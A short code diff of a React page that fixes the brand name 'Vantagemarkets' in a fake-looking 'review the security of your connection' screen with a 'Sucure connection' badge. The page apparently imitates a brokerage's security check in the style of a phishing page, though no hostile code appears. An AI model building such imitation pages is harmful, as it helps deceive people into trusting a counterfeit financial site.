@@ -16,7 +16,7 @@ export default function page() {
     <div>
       <main className={styles.main}>
         <h3 className={styles.text}>
-          Vantagemakets Official Site{" "}
+          Vantagemarkets Official Site{" "}
           <span
             style={{ transform: "translate(0px)", display: "inline-block" }}
           >
@@ -28,7 +28,7 @@ export default function page() {
         </p>
         <p className={styles.text3}>
           We needs to review the security of your connection before proceeding
-          Vantagemakets
+          Vantagemarkets
         </p>
         <div style={{ marginTop: 30 }}>
           <span style={{display: 'inline-block', transform: 'translateY(8px)'}}><FcOk fontSize={30}/></span><span style={{marginLeft: 5}}>Sucure connection</span>
